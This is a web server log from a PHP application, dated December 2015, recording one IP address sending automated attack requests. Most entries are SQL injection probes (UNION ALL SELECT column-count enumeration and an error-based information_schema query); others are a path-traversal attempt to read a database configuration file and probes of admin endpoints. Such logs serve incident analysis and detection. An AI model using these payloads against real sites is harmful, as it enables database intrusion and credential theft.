ERR: 无法加载模块:-1607) UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:03+08:00 ] 121.42.0.36 /?s=-1533%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001163s ]
INFO: [ app_init ] --END-- [ RunTime:0.001515s ]
ERR: 无法加载模块:-1533) UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:04+08:00 ] 121.42.0.36 /?s=-1004%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001103s ]
INFO: [ app_init ] --END-- [ RunTime:0.001468s ]
ERR: 无法加载模块:-1004) UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:04+08:00 ] 121.42.0.36 /?s=-1248%27%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001256s ]
INFO: [ app_init ] --END-- [ RunTime:0.001624s ]
ERR: 无法加载模块:-1248') UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:05+08:00 ] 121.42.0.36 /?s=-1028%27%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001197s ]
INFO: [ app_init ] --END-- [ RunTime:0.001671s ]
ERR: 无法加载模块:-1028') UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:06+08:00 ] 121.42.0.36 /?s=-1124%27%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001138s ]
INFO: [ app_init ] --END-- [ RunTime:0.001504s ]
ERR: 无法加载模块:-1124') UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:06+08:00 ] 121.42.0.36 /?s=-1124%27%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001066s ]
INFO: [ app_init ] --END-- [ RunTime:0.001404s ]
ERR: 无法加载模块:-1124') UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:07+08:00 ] 121.42.0.36 /?s=-1638%27%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001222s ]
INFO: [ app_init ] --END-- [ RunTime:0.001567s ]
ERR: 无法加载模块:-1638') UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:08+08:00 ] 121.42.0.36 /?s=-1008%27%29+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001154s ]
INFO: [ app_init ] --END-- [ RunTime:0.001535s ]
ERR: 无法加载模块:-1008') UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:08+08:00 ] 121.42.0.36 /?s=-1952%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001175s ]
INFO: [ app_init ] --END-- [ RunTime:0.001540s ]
ERR: 无法加载模块:-1952' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:09+08:00 ] 121.42.0.36 /?s=-1267%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001050s ]
INFO: [ app_init ] --END-- [ RunTime:0.001398s ]
ERR: 无法加载模块:-1267' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:10+08:00 ] 121.42.0.36 /?s=-1894%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001134s ]
INFO: [ app_init ] --END-- [ RunTime:0.001552s ]
ERR: 无法加载模块:-1894' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:10+08:00 ] 121.42.0.36 /?s=-1127%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001204s ]
INFO: [ app_init ] --END-- [ RunTime:0.001731s ]
ERR: 无法加载模块:-1127' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:11+08:00 ] 121.42.0.36 /?s=-1045%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001183s ]
INFO: [ app_init ] --END-- [ RunTime:0.001553s ]
ERR: 无法加载模块:-1045' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:12+08:00 ] 121.42.0.36 /?s=-1815%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001144s ]
INFO: [ app_init ] --END-- [ RunTime:0.001488s ]
ERR: 无法加载模块:-1815' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:13+08:00 ] 121.42.0.36 /?s=-1021%25%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001124s ]
INFO: [ app_init ] --END-- [ RunTime:0.001497s ]
ERR: 无法加载模块:-1021%' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:13+08:00 ] 121.42.0.36 /?s=-1384%25%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001095s ]
INFO: [ app_init ] --END-- [ RunTime:0.001443s ]
ERR: 无法加载模块:-1384%' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:14+08:00 ] 121.42.0.36 /?s=-1884%25%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001119s ]
INFO: [ app_init ] --END-- [ RunTime:0.001492s ]
ERR: 无法加载模块:-1884%' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:15+08:00 ] 121.42.0.36 /?s=-1973%25%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001659s ]
INFO: [ app_init ] --END-- [ RunTime:0.002187s ]
ERR: 无法加载模块:-1973%' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:15+08:00 ] 121.42.0.36 /?s=-1261%25%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001670s ]
INFO: [ app_init ] --END-- [ RunTime:0.002164s ]
ERR: 无法加载模块:-1261%' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:16+08:00 ] 121.42.0.36 /?s=-1291%25%27+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001183s ]
INFO: [ app_init ] --END-- [ RunTime:0.001525s ]
ERR: 无法加载模块:-1291%' UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:16+08:00 ] 121.42.0.36 /?s=-1082+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001112s ]
INFO: [ app_init ] --END-- [ RunTime:0.001487s ]
ERR: 无法加载模块:-1082 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:17+08:00 ] 121.42.0.36 /?s=-1462+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001134s ]
INFO: [ app_init ] --END-- [ RunTime:0.001480s ]
ERR: 无法加载模块:-1462 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:18+08:00 ] 121.42.0.36 /?s=-1890+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001084s ]
INFO: [ app_init ] --END-- [ RunTime:0.001434s ]
ERR: 无法加载模块:-1890 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:18+08:00 ] 121.42.0.36 /?s=-1431+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001070s ]
INFO: [ app_init ] --END-- [ RunTime:0.001427s ]
ERR: 无法加载模块:-1431 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:19+08:00 ] 121.42.0.36 /?s=-2001+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001093s ]
INFO: [ app_init ] --END-- [ RunTime:0.001444s ]
ERR: 无法加载模块:-2001 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:20+08:00 ] 121.42.0.36 /?s=-1662+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001119s ]
INFO: [ app_init ] --END-- [ RunTime:0.001476s ]
ERR: 无法加载模块:-1662 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:20+08:00 ] 121.42.0.36 /?s=-1380+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001129s ]
INFO: [ app_init ] --END-- [ RunTime:0.001515s ]
ERR: 无法加载模块:-1380 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:21+08:00 ] 121.42.0.36 /?s=-1830+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001120s ]
INFO: [ app_init ] --END-- [ RunTime:0.001597s ]
ERR: 无法加载模块:-1830 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:22+08:00 ] 121.42.0.36 /?s=-1334+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000031s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001345s ]
INFO: [ app_init ] --END-- [ RunTime:0.001890s ]
ERR: 无法加载模块:-1334 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:22+08:00 ] 121.42.0.36 /?s=-1221+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001176s ]
INFO: [ app_init ] --END-- [ RunTime:0.001537s ]
ERR: 无法加载模块:-1221 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:23+08:00 ] 121.42.0.36 /?s=-1751+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001186s ]
INFO: [ app_init ] --END-- [ RunTime:0.001569s ]
ERR: 无法加载模块:-1751 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:34:24+08:00 ] 121.42.0.36 /?s=-1636+UNION+ALL+SELECT+CONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29%2CCONCAT%280x67715945704a%2C0x78684d745147%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001189s ]
INFO: [ app_init ] --END-- [ RunTime:0.001559s ]
ERR: 无法加载模块:-1636 UNION ALL SELECT CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147),CONCAT(0x67715945704a,0x78684d745147)-- 

[ 2015-12-17T11:38:19+08:00 ] 121.42.0.36 /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001445s ]
INFO: [ app_init ] --END-- [ RunTime:0.001901s ]
ERR: 无法加载模块:Search

[ 2015-12-17T11:39:01+08:00 ] 121.42.0.36 /index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001105s ]
INFO: [ app_init ] --END-- [ RunTime:0.001453s ]
ERR: 无法加载模块:Goods

[ 2015-12-17T11:39:50+08:00 ] 121.42.0.36 /index.php?m=tg/admin&s=delivery_address
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001176s ]
INFO: [ app_init ] --END-- [ RunTime:0.001542s ]
ERR: 无法加载模块:Delivery_address

[ 2015-12-17T11:39:51+08:00 ] 121.42.0.36 /index.php?m=download/admin&s=order_update
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001271s ]
INFO: [ app_init ] --END-- [ RunTime:0.001661s ]
ERR: 无法加载模块:Order_update

[ 2015-12-17T11:39:54+08:00 ] 121.42.0.36 /index.php?m=buy/admin&s=add_cat
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001252s ]
INFO: [ app_init ] --END-- [ RunTime:0.001628s ]
ERR: 无法加载模块:Add_cat

[ 2015-12-17T11:40:21+08:00 ] 121.42.0.36 /index.php?m=vote&c=index&a=post&subjectid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001096s ]
INFO: [ app_init ] --END-- [ RunTime:0.001482s ]
ERR: 无法加载模块:Vote

[ 2015-12-17T11:52:13+08:00 ] 121.42.0.36 /index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001122s ]
INFO: [ app_init ] --END-- [ RunTime:0.001493s ]
ERR: 无法加载模块:Search

[ 2015-12-17T12:10:31+08:00 ] 121.42.0.36 /index.php?m=Goods&a=showcate&id=103%20and%20(select%201%20from%20(select%20count(*),concat(md5(233333),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001196s ]
INFO: [ app_init ] --END-- [ RunTime:0.001595s ]
ERR: 无法加载模块:Goods

[ 2015-12-17T12:30:53+08:00 ] 121.42.0.36 /index.php?m=tg/admin&s=delivery_address
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001716s ]
INFO: [ app_init ] --END-- [ RunTime:0.002262s ]
ERR: 无法加载模块:Delivery_address

[ 2015-12-17T12:31:54+08:00 ] 121.42.0.36 /index.php?m=download/admin&s=order_update
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001209s ]
INFO: [ app_init ] --END-- [ RunTime:0.001564s ]
ERR: 无法加载模块:Order_update

[ 2015-12-17T12:32:48+08:00 ] 121.42.0.36 /index.php?m=buy/admin&s=add_cat
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001104s ]
INFO: [ app_init ] --END-- [ RunTime:0.001448s ]
ERR: 无法加载模块:Add_cat

[ 2015-12-17T12:33:48+08:00 ] 121.42.0.36 /index.php?m=vote&c=index&a=post&subjectid=2
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001136s ]
INFO: [ app_init ] --END-- [ RunTime:0.001518s ]
ERR: 无法加载模块:Vote

[ 2015-12-17T12:33:49+08:00 ] 121.42.0.36 /index.php?m=vote&c=index&a=result&subjectid=2&siteid=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001273s ]
